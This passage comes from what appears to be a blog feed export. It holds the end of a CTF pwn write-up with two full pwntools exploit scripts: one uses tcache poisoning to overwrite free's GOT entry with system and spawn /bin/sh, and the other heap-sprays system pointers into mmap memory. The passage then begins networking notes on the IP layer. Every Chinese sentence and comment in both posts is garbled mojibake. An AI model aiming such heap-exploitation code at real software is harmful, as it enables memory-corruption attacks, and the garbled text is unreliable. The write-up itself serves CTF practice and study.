class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your food name: &#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a remark: &#x27;</span>)</span><br><span class="line">    io.send(remark)<span class="comment">#second 8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">    io.send(name)<span class="comment">#first 8</span></span><br><span class="line">command=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dir /home/grxer/share/libc-source/glibc-2.31/malloc</span></span><br><span class="line"><span class="string">b *0x004013E8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,command)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#editæ³„éœ²å †åœ°å€ï¼Œä¿®æ”¹tcacheçš„nextæŒ‡é’ˆ</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">ru(<span class="string">b&#x27;r is: &#x27;</span>)</span><br><span class="line">heap=uu64(r(<span class="number">4</span>))</span><br><span class="line">heap0=heap+ <span class="number">0x12d0</span></span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x4040A0</span>))<span class="comment">#first 8</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;c&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"><span class="comment">#heap0å°±å˜ä¸ºå †ç®¡ç†ç»“æ„,freegotå˜ä¸ºäº†ç¬¬ä¸€ä¸ªå †å¯¹è±¡</span></span><br><span class="line">add(<span class="number">3</span>,p64(heap0),<span class="string">b&#x27;fake&#x27;</span>)<span class="comment">#malloc 0x4040A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#editæ³„éœ²putsgotå’Œä¿®æ”¹freegot</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">ru(<span class="string">b&#x27;r is: &#x27;</span>)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">io.send(p64(system))<span class="comment">#first 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heapSpary"><a href="#heapSpary" class="headerlink" title="heapSpary"></a>heapSpary</h2><p>Createå †é‡Œæ˜¯ä¸€æ¬¡ç”³è¯·16ä¸ªå †ï¼Œå †å—çš„é¡ºåºæ˜¯ä¹±çš„ï¼Œåœ¨å¾€å †å†™æ•°æ®æ—¶æ²¡æœ‰é™åˆ¶å¤§å°å¯ä»¥æ— é™å †æº¢å‡º</p><p>Actionæ˜¯ä¸€ä¸ªåé—¨</p><p><img src="/2023/09/15/2023-lmb/image-20230916223113773.png" alt="image-20230916223113773"></p><p>æˆ‘ä»¬éœ€è¦å †+å †å¤§å°å¤„å­˜æ”¾çš„åœ°å€çš„å‰å››ä¸ªå­—èŠ‚ä¸º0ï¼Œåå››ä¸ªå­—èŠ‚ä¸ºsystemå°±å¯ä»¥æ‹¿åˆ°flag</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="type">void</span>*)(heap_ptr+size)------&gt;<span class="number">0</span></span><br><span class="line">                              system</span><br></pre></td></tr></table></figure><p>æ³„éœ²libcï¼Œè™½ç„¶æœ‰å †æº¢å‡ºï¼Œä½†æ˜¯å´åœ¨è¾“å…¥åæœ‰\x00æˆªæ–­å¸¸è§„unsortedbinæ³„éœ²å°±å¤±æ•ˆäº†ï¼Œä½†æ˜¯Createå †æ—¶flagæ˜¯å¾€å †+å †sizeä½ç½®å†™å…¥å››ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–æ‰è¿™ä¸ª&#x2F;x00</p><p>æ¯”å¦‚æˆ‘ä»¬ç”³è¯·creatå¤§å°ä¸º1ï¼Œè¿™ä¸ªå€¼åªä¼šè¦†ç›–unsortedå †çš„fdåŠbkçš„ç¬¬ä¸€ä¸ªbitï¼Œå¦‚æœbkæ­¤æ—¶æŒ‡å‘æ˜¯unsortedbinå°±å¯ä»¥æ³„éœ²å‡ºlibcï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åˆ›å»ºå¤§å°ä¸º1çš„å †å—åˆ‡å‰²unsortedbinæ¥æ³„éœ²libc</p><p>æœ‰äº†libcå°±æ˜¯éœ€è¦å¸ƒç½®æ»¡è¶³åé—¨çš„å †å—ï¼Œå¯ä»¥ç”³è¯·0x20000å¤§å°çš„å †æ¥mmapå†…å­˜ï¼Œä½†æ˜¯è¿™é“é¢˜å¼€äº†pieï¼Œmmapçš„ä½ç½®æ˜¯éšæœºçš„ï¼Œä½†æ˜¯éšæœºçš„ä¸å¤šï¼Œç¨‹åºä¸€æ¬¡ç”³è¯·16ä¸ªæ¥å †å–·ï¼ŒåŸºæœ¬ä¸Šä½ç½®éƒ½åœ¨libcä¸‹é¢åç§»0x24f000å¤„å¾—åˆ°</p><p>åˆ©ç”¨mmapå †å–·åœ¨libcä¸‹é¢å¸ƒç½®å¤§é‡çš„p32(0)+p32(systme)ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªä½ç½®å«slide</p><p>å†åˆ©ç”¨creatå †æº¢å‡ºå¾€å †ä¸Šå†™å¤§é‡çš„p32(slide)ï¼Œç”±äºcreatæ˜¯ä¹±åºçš„ï¼Œå½“å‡ºç°ä¸‹é¢çš„æƒ…å†µæ—¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">heapA+<span class="number">10</span>,heapA</span><br></pre></td></tr></table></figure><p>heapAå †æº¢å‡ºå¤§é‡çš„p32(slide)å°±å¯ä»¥è¦†ç›–æ‰heapA+10å †å—ï¼Œå°±å¯ä»¥ç»•è¿‡Createé‡ŒWhich flag do you want?çš„èµ‹å€¼</p><p><img src="/2023/09/15/2023-lmb/image-20230916230005552.png" alt="image-20230916230005552"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;ose : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,data,flag</span>):</span><br><span class="line">   menu(<span class="number">1</span>)</span><br><span class="line">   sla(<span class="string">b&#x27;need : &#x27;</span>,<span class="built_in">str</span>(size).encode()) </span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">       sla(<span class="string">b&#x27; data.&#x27;</span>,data)</span><br><span class="line">       sla(<span class="string">b&#x27;want?&#x27;</span>,<span class="built_in">str</span>(flag).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">2</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;index : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">  menu(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">5</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;index : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbpie(0x00017AC)#malloc</span></span><br><span class="line">creat(<span class="number">0x200</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">creat(<span class="number">0x200</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment">#åˆ‡å‰²unsortedbinï¼Œæ³„éœ²libc</span></span><br><span class="line">creat(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">b()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  show(<span class="number">0</span>)</span><br><span class="line">  ru(<span class="string">b&#x27;is a&#x27;</span>)</span><br><span class="line">  r(<span class="number">3</span>)  </span><br><span class="line">  libcbase=uu32(r(<span class="number">4</span>))</span><br><span class="line">  <span class="keyword">if</span> libcbase&gt;<span class="number">0xf0000000</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="comment"># dbpie(0x00017AC)#malloc</span></span><br><span class="line">libcbase-=<span class="number">0x226756</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">delete()</span><br><span class="line">slide=libcbase+<span class="number">0x24f000</span></span><br><span class="line"><span class="comment">#å †å–·å¸ƒç½®åˆé€‚åé—¨</span></span><br><span class="line">creat(<span class="number">0x20000</span>,(p32(<span class="number">0</span>)+p32(system))*(<span class="number">0x20000</span>//<span class="number">8</span>),<span class="number">1</span>)</span><br><span class="line">creat(<span class="number">0x80</span>,p32(slide)*<span class="number">0x100</span>,<span class="number">1</span>)</span><br><span class="line">action(<span class="number">17</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/09/15/2023-lmb/image-20230916221851491.png" alt="image-20230916221851491"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œ:ç½‘ç»œå±‚</title>
      <link href="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p> ç½‘ç»œå±‚åè®®å­˜åœ¨äºæ¯ä¸€ä¸ªä¸»æœºå’Œè·¯ç”±å™¨ï¼Œç½‘ç»œå±‚åˆ†ä¸ºäº†æ•°æ®å¹³é¢å’Œæ§åˆ¶å¹³é¢ï¼Œç½‘ç»œå±‚ä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½</p><ul><li>æ•°æ®å¹³é¢åŠŸèƒ½-&gt;è½¬å‘ : å°†åˆ†ç»„ä»è·¯ç”±å™¨çš„è¾“å…¥æ¥å£è½¬å‘åˆ°åˆé€‚çš„è¾“å‡ºæ¥å£çš„æœ¬åœ°åŠ¨ä½œ<ul><li>ä¼ ç»Ÿæ–¹å¼ï¼šåŸºäºç›®æ ‡åœ°å€åŒ¹é… + è½¬å‘è¡¨</li><li>SDN æ–¹å¼ï¼šåŸºäºå¤šä¸ªå­—æ®µåŒ¹é… + æµè¡¨</li></ul></li><li>æ§åˆ¶å¹³é¢åŠŸèƒ½-&gt;è·¯ç”± : ä½¿ç”¨è·¯ç”±ç®—æ³•æ¥å†³å®šåˆ†ç»„ä»å‘é€ä¸»æœºåˆ°ç›®æ ‡æ¥æ”¶ä¸»æœºçš„è·¯å¾„<ul><li>ä¼ ç»Ÿçš„è·¯ç”±ç®—æ³• : è·¯ç”±å™¨ä¸­çš„å•ç‹¬è·¯ç”±å™¨ç®—æ³•å…ƒä»¶å®ç°</li><li>software-defined networking(SDN): åœ¨è¿œç¨‹çš„æœåŠ¡å™¨ä¸­å®ç°</li></ul></li></ul><h2 id="æ•°æ®å¹³é¢"><a href="#æ•°æ®å¹³é¢" class="headerlink" title="æ•°æ®å¹³é¢"></a>æ•°æ®å¹³é¢</h2><h3 id="è·¯ç”±å™¨"><a href="#è·¯ç”±å™¨" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h3><p>è·¯ç”±å™¨åè®®æ ˆå…·æœ‰æˆªæ–­çš„åè®®æ ˆ:ç½‘ç»œå±‚ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç‰©ç†å±‚</p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913090338827.png" alt="image-20230913090338827"></p><p><strong>è¾“å…¥ç«¯å£</strong></p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913091009625.png" alt="image-20230913091009625"></p><p>ç»™å®šç›®æ ‡åœ°å€æŸ¥æ‰¾è½¬å‘è¡¨æ—¶é‡‡ç”¨äº†æœ€é•¿å‰ç¼€åŒ¹é…:è¡¨ä¸­å¯»æ‰¾æœ€é•¿çš„åŒ¹é…é¡¹å¹¶å‘ä¸æœ€é•¿å‰ç¼€åŒ¹é…ç›¸å…³è”çš„é“¾è·¯æ¥å£è½¬å‘åˆ†ç»„</p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913091500271.png" alt="image-20230913091500271"></p><p><strong>äº¤æ¢ç»“æ„</strong></p><p>å°†åˆ†ç»„ä»è¾“å…¥ç¼“å†²åŒºä¼ è¾“åˆ°åˆé€‚çš„è¾“å‡ºç«¯å£</p><ul><li><p>é€šè¿‡å†…å­˜äº¤æ¢</p></li><li><p>é€šè¿‡æ€»çº¿äº¤æ¢</p></li><li><p>é€šè¿‡äº’è”ç½‘ç»œçš„äº¤æ¢</p></li></ul><p><strong>è¾“å‡ºç«¯å£</strong></p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913092208493.png" alt="image-20230913092208493"></p><h3 id="ç½‘é™…åè®®-Internet-Protocol-IP"><a href="#ç½‘é™…åè®®-Internet-Protocol-IP" class="headerlink" title="ç½‘é™…åè®®(Internet Protocol,IP)"></a>ç½‘é™…åè®®(Internet Protocol,IP)</h3><p>æ¥å£æ˜¯ä¸»æœº&#x2F;è·¯ç”±å™¨å’Œç‰©ç†é“¾è·¯çš„è¿æ¥å¤„ï¼Œä¸€ä¸ªIPåœ°å€ä¸ä¸€ä¸ªæ¥å£ç›¸å…³è”ï¼Œè€Œä¸æ˜¯ä¸åŒ…æ‹¬è¯¥æ¥å£çš„ä¸»æœºæˆ–è·¯ç”±å™¨ç›¸å…³è” </p><h4 id="IPv4-æ•°æ®æŠ¥æ ¼å¼"><a href="#IPv4-æ•°æ®æŠ¥æ ¼å¼" class="headerlink" title="IPv4 æ•°æ®æŠ¥æ ¼å¼"></a>IPv4 æ•°æ®æŠ¥æ ¼å¼</h4><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913155055390.png" alt="image-20230913155055390"></p><p><strong>ç‰ˆæœ¬å·</strong>ï¼šIPv4:0100 OR IPv6:0110</p><p><strong>é¦–éƒ¨é•¿åº¦</strong>: ä»¥4å­—èŠ‚ä¸ºå•ä½</p><p><strong>æœåŠ¡ç±»å‹</strong>ï¼šç”¨äºè¡¨ç¤ºæ•°æ®æŠ¥çš„ä¼˜å…ˆçº§å’ŒæœåŠ¡ç±»å‹</p><p><strong>æ€»é•¿åº¦</strong>ï¼šé¦–éƒ¨+æ•°æ®ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½</p><p><strong>æ ‡è¯†ã€æ ‡å¿—ä½ã€ç‰‡åç§»</strong></p><p>ä¸åŒçš„é“¾è·¯å±‚åè®®å…·æœ‰ä¸åŒçš„MTUï¼Œæœ‰æ—¶éœ€è¦å¯¹æ•°æ®æŠ¥åˆ†ç‰‡ä¼ è¾“(æŠŠæ•°æ®åˆ‡å‰²ååŠ ä¸Šipå¤´)ï¼Œåˆ°ç«¯ç³»ç»Ÿç»„è£…</p><ul><li>æ ‡è¯†ï¼šå‘é€æ–¹æ¯äº§ç”Ÿä¸€ä¸ªæ•°æ®æŠ¥ï¼Œæ ‡è¯†è®¡æ•°å™¨å°±åŠ 1ï¼Œæ•°æ®æŠ¥éœ€è¦åˆ†ç‰‡æ—¶ï¼Œè¯¥æ ‡è¯†ç¬¦çš„å€¼å°±è¢«å¤åˆ¶åˆ°æ‰€æœ‰çš„æ•°æ®æŠ¥åˆ†ç‰‡çš„æ ‡è¯†å­—æ®µä¸­ï¼Œæ¥æ”¶æ–¹çœ‹åˆ°ç›¸åŒçš„æ ‡è¯†ç¬¦å°±çŸ¥é“æ˜¯æ¥è‡ªåŒä¸€ä¸ªæ•°æ®æŠ¥çš„åˆ†ç‰‡</li><li>æ ‡å¿—ä½ï¼š3bit(NUL,DF,MF)<ul><li>æœ€ä½ä¸€ä½è®°ä¸ºMFï¼ˆMore Fragment)ï¼ŒMF&#x3D;1ï¼Œåˆ™è¡¨ç¤ºåé¢è¿˜æœ‰åˆ†ç‰‡ï¼Œå¦‚æœMF&#x3D;0è¡¨ç¤ºè¿™å·²æ˜¯æŸä¸ªæ•°æ®æŠ¥çš„æœ€åä¸€ä¸ªåˆ†ç‰‡</li><li>ä¸­é—´ä¸€ä½è®°ä¸ºDFï¼ˆDonâ€™t Fragmentï¼‰ï¼Œå½“DF&#x3D;1æ—¶è¡¨ç¤ºä¸èƒ½å¯¹ipæ•°æ®æŠ¥åˆ†ç‰‡ï¼ŒDF&#x3D;0è¡¨ç¤ºå…è®¸åˆ†æ®µ</li><li>æœ€é«˜ä½æš‚æ—¶æ²¡ç”¨</li></ul></li><li>ç‰‡åç§»ï¼š16bitï¼Œåˆ†ç‰‡æ•°æ®åœ¨åŸå§‹æ•°æ®æŠ¥ä¸­çš„åç§»é‡ï¼Œä»¥8å­—èŠ‚ä½å•ä½</li></ul><p><strong>ç”Ÿå­˜æ—¶é—´(Time To Live)</strong>:æ²¡ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨TTL-1ï¼Œå½“TTLå€¼ä¸º0æ—¶ï¼Œå°±ä¸¢å¼ƒè¿™ä¸ªæ•°æ®æŠ¥</p><p><strong>åè®®</strong>ï¼šæ ‡è¯†IPæ•°æ®æŠ¥åœ¨ä¼ è¾“å±‚æ‰€é‡‡ç”¨çš„åè®®ç±»å‹(å¦‚TCPä¸º6ã€UDPä¸º17 ICMPä¸º1ç­‰ç­‰),IP æ•°æ®æŠ¥åˆ°è¾¾å…¶æœ€ç»ˆç›®çš„åœ°ç¡®å®šæ•°æ®åº”è¯¥äº¤ç»™é‚£ä¸ªä¼ è¾“å±‚åè®®</p><p><strong>é¦–éƒ¨æ ¡éªŒå’Œ</strong>ï¼šå’Œudpä¸€æ ·ï¼Œä¸è¿‡æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œç”±äºttlçš„å‡ä¸€ï¼Œéœ€è¦é‡æ–°è®¡ç®—è¯¥å€¼</p><h4 id="IPv4ç¼–ç "><a href="#IPv4ç¼–ç " class="headerlink" title="IPv4ç¼–ç "></a>IPv4ç¼–ç </h4><p>32bitï¼Œä¸€èˆ¬ç”¨ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•</p><ul><li><strong>IPåœ°å€æ„æˆ</strong>ï¼šç½‘ç»œä½+ä¸»æœºä½ ï¼ˆç½‘ç»œä½ç›¸åŒçš„IPåœ°å€ï¼Œä¸ºåŒä¸€ç½‘æ®µï¼‰</li><li><strong>å­ç½‘æ©ç </strong>ï¼š ç”¨æ¥ç¡®å®šIPåœ°å€çš„ç½‘ç»œä½(å­ç½‘æ©ç ä¸IPåœ°å€åšä¸è¿ç®—ç¡®å®š)</li></ul><table><thead><tr><th align="center"></th><th align="center"><strong>Aç±»IPv4åœ°å€</strong></th><th align="center"><strong>Bç±»IPv4åœ°å€</strong></th><th align="center"><strong>Cç±»IPv4åœ°å€</strong></th><th align="center"><strong>Dç±»IPv4åœ°å€</strong></th><th align="center"><strong>Eç±»IPv4åœ°å€</strong></th></tr></thead><tbody><tr><td align="center"><strong>ç½‘ç»œæ ‡å¿—ä½</strong></td><td align="center">0</td><td align="center">10</td><td align="center">110</td><td align="center">1110</td><td align="center">11110</td></tr><tr><td align="center"><strong>IPåœ°å€èŒƒå›´</strong></td><td align="center">0.0.0.0~127.255.255.255</td><td align="center">128.0.0.0~191.255.255.255</td><td align="center">192.0.0.0~223.255.255.255</td><td align="center">224.0.0.0~239.255.255.255</td><td align="center">240.0.0.0~255.255.255.255</td></tr><tr><td align="center"><strong>å¯ç”¨IPåœ°å€èŒƒå›´</strong></td><td align="center">1.0.0.1~127.255.255.254</td><td align="center">128.0.0.1~191.255.255.254</td><td align="center">192.0.0.1~223.255.255.254</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>å­ç½‘æ©ç </strong></td><td align="center">255.0.0.0</td><td align="center">255.255.0.0</td><td align="center">255.255.255.0</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>æ˜¯å¦å¯ä»¥åˆ†é…ç»™ä¸»æœºä½¿ç”¨</strong></td><td align="center">æ˜¯</td><td align="center">æ˜¯</td><td align="center">æ˜¯</td><td align="center">å¦</td><td align="center">å¦</td></tr><tr><td align="center"><strong>ç½‘ç»œæ•°é‡ï¼ˆä¸ªï¼‰</strong></td><td align="center">126 ($2^7$-2)</td><td align="center">16384 ($2^{14}$)</td><td align="center">2097152 ($2^{21}$)</td><td align="center">â€”</td><td align="center">â€”</td></tr><tr><td align="center"><strong>æ¯ä¸ªç½‘ç»œä¸­å¯å®¹çº³ä¸»æœºæ•°ï¼ˆä¸ªï¼‰</strong></td><td align="center">16777214 ($2^{24}$-2)</td><td align="center">65534 ($2^{16}$-2)</td><td align="center">254 ($2^{8}$-2)</td><td align="center">â€”</td><td align="center">â€”</td></tr><tr><td align="center"><strong>é€‚ç”¨èŒƒå›´</strong></td><td align="center">å¤§é‡ä¸»æœºçš„å¤§å‹ç½‘ç»œ</td><td align="center">ä¸­ç­‰è§„æ¨¡ä¸»æœºæ•°çš„ç½‘ç»œ</td><td align="center">å°å‹å±€åŸŸç½‘</td><td align="center">ç•™ç»™Internetä½“ç³»ç»“æ„å§”å‘˜ä¼š(IAB)ä½¿ç”¨ã€ç»„æ’­åœ°å€ã€‘</td><td align="center">ä¿ç•™ï¼Œä»…ä½œä¸ºæœç´¢ã€Internetçš„å®éªŒå’Œå¼€å‘ç”¨</td></tr><tr><td 